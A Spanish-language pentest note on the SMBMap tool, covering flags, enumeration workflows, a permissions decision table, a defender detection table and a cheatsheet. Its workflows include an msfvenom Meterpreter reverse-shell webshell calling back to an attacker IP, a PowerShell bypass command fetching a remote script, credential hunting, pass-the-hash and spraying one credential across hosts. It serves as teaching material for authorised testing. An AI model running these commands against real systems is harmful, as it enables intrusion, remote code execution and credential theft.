---
tags:
  - ciberseguridad
  - herramientas
  - smbmap
tipo: herramienta
estado: terminado
---

# SMBMap

**SMBMap** es una herramienta de enumeración SMB enfocada en una pregunta concreta: **¿qué shares puedo leer y escribir, y qué hay dentro?** Con un solo comando barre todos los shares de un host (o de una lista), marca permisos READ/WRITE, permite bajar archivos, subir payloads y ejecutar comandos cuando hay permisos administrativos. Es la respuesta natural a un 445 abierto descubierto con [[Nmap Guía Completa]].

> [!info] El ángulo de SMBMap
> [[smbclient Cliente de Línea de Comandos para SMBCIFS]] te obliga a entrar a cada share manualmente. SMBMap resuelve el 80 % de la fase de enumeración en una ejecución: mapa de shares + permisos + contenido recursivo, y detecta de paso los shares **escribibles** — que son donde vive el impacto (upload de payload, plantado de binarios, RCE vía ADMIN$).

## SMBMap vs el ecosistema SMB

| Herramienta | Fortaleza | Cuándo usarla |
|---|---|---|
| **smbmap** | Permisos de todos los shares + recursivo + upload/exec | Primera pasada sobre un host con credenciales |
| **smbclient** | Cliente interactivo, transferencia fina | Navegar y extraer cosas concretas ([[smbclient Cliente de Línea de Comandos para SMBCIFS]]) |
| **CrackMapExec** | Múltiples hosts, logging, módulos post-ex | Red completa con credenciales válidas ([[CrackMapExec Guía de Uso]]) |
| **Impacket** | Ejecución remota real (psexec/wmiexec), secretsdump | Obtener shell y dumps — el `-x` de smbmap es más limitado |

Flujo recomendado: `Nmap (445)` → **smbmap (¿qué hay?)** → smbclient (extraer) / CME+Impacket (explotar).

## Instalación

| Contexto | Comando |
|---|---|
| **Kali Linux** | Preinstalado (`smbmap --help`) |
| pip | `pip install smbmap` (versión oficial en GitHub: ShawnDEvans/smbmap) |
| Dependencias | `impacket`, `pysmb` |

Requiere Python 3. No necesita root (no usa paquetes crudos).

## Referencia de flags

### Conexión

| Flag | Significado | Ejemplo |
|---|---|---|
| `-H <host>` | Host objetivo (obligatorio salvo `-L` remoto) | `-H 10.10.10.50` |
| `-u <usuario>` | Usuario (vacío o ausente = anónimo/nulo) | `-u backup_svc` |
| `-p <password>` | Contraseña (vacío = pass vacía o nula) | `-p 'Pass123'` |
| `-d <dominio>` | Dominio AD | `-d CORP` |
| `-P <puerto>` | Puerto SMB (defecto 445) | `-P 139` |
| `--pw-hash` | Autenticar con **hash NTLM** en vez de password | `--pw-hash aad3b435b51404eeaad3b435b51404ee:...` |
| `--timeout` | Timeout de conexión (segundos) | `--timeout 10` |

### Enumeración

| Flag | Significado | Ejemplo |
|---|---|---|
| `-L` | Listar los shares del host | `smbmap -H 10.10.10.50 -u u -p p -L` |
| `-r [SHARE]` | Listado **no recursivo** (directorio indicado o raíz) | `-r 'backups'` |
| `-R [DIR]` | Listado **recursivo** del árbol | `-R 'backups\2026'` |
| `--ls <DIR>` | Listado de un directorio concreto | `--ls 'C$\Users'` |
| `--dir-only` | Solo directorios (limpia la salida para informes) | `--dir-only` |
| `-F <filtro>` | Filtra shares por permisos (regex sobre READ FILE/WRITE FILE) | `-F "WRITE"` |
| `-o <archivo>` | Guarda el log completo de la salida | `-o smbmap.log` |
| `-v` / `-q` | Verboso / silencioso (solo resultados) | `-q` |
| `--no-banner` | Oculta la cabecera ASCII (para scripts) | |
| `--no-write-check` | No prueba escritura real en cada share (más rápido, menos ruidoso) | |

> [!warning] Correcciones sobre flags de guías antiguas
> - El borrado se llama **`--rm`**, no `--delete`.
> - `-r` no es "un nivel de profundidad" técnico: es el listado plano; `-R` sí es recursivo (y acepta subdirectorio como argumento).
> - No existe `--admin`: para shares administrativos se accede directamente (`-R 'C$'`, `-R 'ADMIN$'`).

### Transferencia y ejecución

| Flag | Significado | Ejemplo |
|---|---|---|
| `--download <SHARE\RUTA>` | Descarga un archivo (`\` como separador Windows) | `--download 'backups\creds.xlsx'` |
| `--upload <local> <remoto>` | Sube un archivo local al share | `--upload payload.aspx 'wwwupload\payload.aspx'` |
| `--rm <SHARE\RUTA>` | Borra un archivo remoto | `--rm 'tmp\prueba.txt'` |
| `-x <comando>` | **Ejecuta** comando en el host (requiere permisos en ADMIN$/C$) | `-x "whoami"` |
| `--level {1,2,3}` | Método de ejecución cuando `-x` tiene varias vías (cmd/PowerShell) | `--level 2` |
| `--no-pass` | Fuerza sesión sin contraseña (null session) | |

## Flujos de trabajo

### 1. Pasada inicial sobre un host (la receta de oro)

```bash
smbmap -H 10.10.10.50 -u 'CORP\user' -p 'Pass123' -R
```

Salida e interpretación:

```
[+] IP: 10.10.10.50:445       Name: ...
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        backups                                                 READ, WRITE     Copias nocturnas
```

| Columna | Qué aporta |
|---|---|
| `Permissions` | `READ ONLY` = enumerar/bajar; `READ, WRITE` = **impacto directo** (upload → RCE en web, persistencia, exfiltración invertida); `NO ACCESS` = sin privilegio con estas creds |
| `Comment` | Info del comentario SMB — a veces revela el dueño o propósito |
| `READ FILE`/`WRITE FILE` (con `-F`) | Permiso a nivel de archivo cuando ACLs por share no cuentan toda la historia |

> [!warning] Permisos de share ≠ permisos NTFS
> La columna `Permissions` de smbmap refleja el **permiso del share** (SMB). Los ACLs de NTFS del directorio de detrás pueden ser más restrictivos: un share `READ, WRITE` puede dar `ACCESS_DENIED` al `put` real si las NTFS lo vetan. smbmap hace una escritura de prueba por defecto (`--no-write-check` la desactiva) — si un WRITE reportado no permite subir, verificar con [[smbclient Cliente de Línea de Comandos para SMBCIFS]] y el error NTFS exacto.

> [!tip] Primero permisos, luego contenido
> La secuencia eficiente: `-R` completo → identificar los `READ, WRITE` → solo esos con `-R 'share'` a fondo → `--download` de lo interesante. Bajar recursivamente `C$` completo es un error de novato (horas y gigas).

### 2. Null session / anónimo

```bash
# Sin credenciales — ¿qué hay?
smbmap -H 10.10.10.50

# Solo listar shares sin entrar
smbmap -H 10.10.10.50 -L
```

Si devuelve shares más allá de `IPC$`, tienes un **null session habilitado** — hallazgo por sí mismo, y puerta a `enum4linux`/enum usuarios.

### 3. Descargar evidencias

```bash
# Un archivo concreto
smbmap -H 10.10.10.50 -u u -p p --download 'backups\web.config'

# Buscar credenciales: filtrar nombres sensibles del listado recursivo
smbmap -H 10.10.10.50 -u u -p p -R 'backups' | grep -iE 'pass|cred|secret|config|backup'

# Todo lo del share a disco (solo READ)
smbmap -H 10.10.10.50 -u u -p p -R 'backups' -o enumeracion.log
```

El `web.config` de ASP.NET es la mina de oro habitual: `<connectionStrings>` con passwords de BD en claro, a menudo reutilizadas.

### 4. Subir payload (share escribible → impacto)

```bash
# Generar webshell (ver Msfvenom para el catálogo completo)
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.10.14.5 LPORT=8080 -f aspx -o shell.aspx

# Subir al share escribible
smbmap -H 10.10.10.50 -u u -p p --upload shell.aspx 'wwwupload\shell.aspx'

# Si el share es además webroot (o accesible por HTTP), disparar el handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_http; set LHOST 10.10.14.5; set LPORT 8080; run -j"
```

### 5. Ejecución con `-x` (requiere ADMIN$/C$ write)

```bash
smbmap -H 10.10.10.50 -u Administrator -p 'Admin123' -x "whoami"
smbmap -H 10.10.10.50 -u Administrator -p 'Admin123' -x "powershell -ep bypass -f <http://10.10.14.5/s.ps1>" --level 2
```

El `-x` usa los shares administrativos para plantar y ejecutar (mecanismos tipo task/service). Si no hay `ADMIN$`/`C$` con escritura, el comando falla — en ese caso la vía es [[CrackMapExec Guía de Uso]] (`-x` con módulos) o Impacket (`wmiexec.py`, `psexec.py`).

### Tabla de decisión: qué hacer según los permisos obtenidos

| Permiso observado | Siguiente paso |
|---|---|
| `IPC$` READ anónimo | Enumeración de usuarios/sistemas (enum4linux-ng, rpcclient) — puerta de info sin creds |
| READ en `SYSVOL`/`NETLOGON` | Buscar `Groups.xml`/`ScheduledTasks.xml` con GPP passwords (hashes MS) |
| READ en share de datos | Exfiltración selectiva: filtrar por nombres sensibles antes de bajar |
| WRITE en share **webroot** | Upload webshell → RCE ([[Msfvenom - Herramienta de Generación de Payloads]]) |
| WRITE en share genérico | Persistencia/exfil invertida; plantar binarios si el share se ejecuta desde ahí |
| `ADMIN$`/`C$` WRITE | Ejecución remota directa (`-x`, CME, Impacket) — impacto crítico documentado |
| Solo `NO ACCESS` en todos | Guardar creds para pass-the-hash/relay o combos con [[THC Hydra]] |

### 6. Fuerza bruta de shares con credenciales válidas (modo "guerra de credenciales")

```bash
# Una credencial válida × lista de hosts con 445 (de Nmap -oG)
grep "/open/" nmap-smb.gnmap | awk '{print $2}' > hosts.txt
while read ip; do
  smbmap -H $ip -u 'CORP\svc_backup' -p 'Winter2026!' -q --no-banner | grep -E "\[|READ|WRITE"
done < hosts.txt
```

Credenciales reutilizadas entre hosts es el hallazgo que más veces abre el dominio — [[CrackMapExec Guía de Uso]] lo automatiza mejor, pero smbmap da la vista de shares.

## Detección y contramedidas (visión del defensor)

| Actividad | Señal | Contramedida |
|---|---|---|
| Barrido de todos los shares | 5140/5145 masivos por sesión (access listing de cada share) | Alerta "share enumeration"; segmentación por OU |
| Prueba de escritura (`--no-write-check` off) | Archivos temporales de prueba aparecen/desaparecen | Honeypots en shares poco usados (canary files) |
| Null session | Login anónimo IPC$ (4624 tipo 3) | `RestrictAnonymousSAM`, SMB signing + relaying protections |
| `-x`/upload a ADMIN$ | Copia de binario a `ADMIN$\Temp` + ejecución (servicio/tarea) | EDR sobre ADMIN$ y 4688 con command line auditing |
| Descarga masiva | Cientos de open/read NTFS por sesión | DLP y umbral de volumen por estación origen |

## Errores comunes (con mensajes exactos)

| Mensaje / síntoma | Causa | Fix |
|---|---|---|
| `[-] SMB Session Error: ... NT_STATUS_LOGON_FAILURE` | Credenciales incorrectas o dominio ausente | `-d DOMINIO`; probar `DOMINIO\usuario` en `-u` |
| `[-] Error enumerating share: ... NT_STATUS_ACCESS_DENIED` | Share existe pero sin permiso | Probar otras creds o centrarse en los shares legibles |
| `[-] SMB Session Error: NT_STATUS_CONNECTION_DISCONNECTED` | Negociación de dialecto (SMB1 vs SMB2/3) | Actualizar smbmap/impacket; comprobar versión SMB del server con Nmap |
| `[-] Unable to connect to share: BAD_NETWORK_NAME` | Nombre de share erróneo o rama `\` mal escrita | Copiar nombres de `-L`; usar `\` (backslash) en rutas Windows |
| `--download` no descarga nada | Ruta sin el prefijo del share o `\` invertido | Formato `SHARE\carpeta\archivo` con backslashes |
| `-x` falla con ACCESS_DENIED | Sin escritura en ADMIN$/C$ | El `-x` requiere privilegios de admin local — probar con creds admin o migrar a Impacket |
| Timeout en hosts vivos | WAF/IPS de Microsoft bloqueando escaneo SMB | `--timeout` mayor; en AD moderno, aislar el origen del escaneo al alcance autorizado |
| Salida masiva infinita en `C$` | Recursivo sobre disco completo | Usar `--ls` dirigido y `--dir-only`; nunca `-R 'C$'` a ciegas |

## Cheatsheet

```bash
smbmap -H <ip>                                  # anónimo
smbmap -H <ip> -u u -p p -L                     # shares
smbmap -H <ip> -u u -p p -R                     # shares + contenido recursivo
smbmap -H <ip> -u u -p p -R 'share\dir'         # dirigido
smbmap -H <ip> -u u -p p -F "WRITE"             # solo escribibles
smbmap -H <ip> -u u -p p --download 'share\arch'
smbmap -H <ip> -u u -p p --upload local 'share\remoto'
smbmap -H <ip> -u u -p p --rm 'share\basura.txt'
smbmap -H <ip> -u Administrator -p p -x "whoami" --level 2
smbmap -H <ip> -u u --pw-hash <NTHASH>          # pass-the-hash
smbmap -H <ip> -u u -p p -R -o salida.log -q --no-banner   # para informe
```

## Referencias

- Repositorio oficial: <https://github.com/ShawnDEvans/smbmap>
- Guía de uso con ejemplos: README del repositorio
- Contexto de fase: [[Enumeración de Servicios y CMS]]
- Cliente interactivo hermano: [[smbclient Cliente de Línea de Comandos para SMBCIFS]]

## Relacionadas

- [[smbclient Cliente de Línea de Comandos para SMBCIFS]] — extraer lo que smbmap encuentra
- [[CrackMapExec Guía de Uso]] — escalar la enumeración a red completa
- [[Nmap Guía Completa]] — descubrir el 445 (`--script smb-os-discovery`)
- [[Msfvenom - Herramienta de Generación de Payloads]] — qué subir cuando hay WRITE
- [[THC Hydra]] — si no hay credenciales, fuerza bruta SMB
